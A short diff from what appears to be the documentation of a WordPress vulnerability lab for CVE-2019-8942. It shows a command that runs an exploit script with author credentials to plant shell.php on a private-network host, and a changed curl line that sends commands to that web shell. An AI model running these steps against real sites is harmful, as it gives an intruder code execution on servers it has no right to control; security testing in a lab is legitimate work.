@@ -79,7 +79,7 @@ cd ~/wp-cve-all/exploits/cve-2019-8942
 # Use provided polyglot
 ./scripts/manual_exploit.sh http://192.168.4.36:18180 author AuthorPass123! shell.php
 # Access shell
-curl "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
+curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=whoami"
 ```
 
 #### Manual Steps (Detailed)
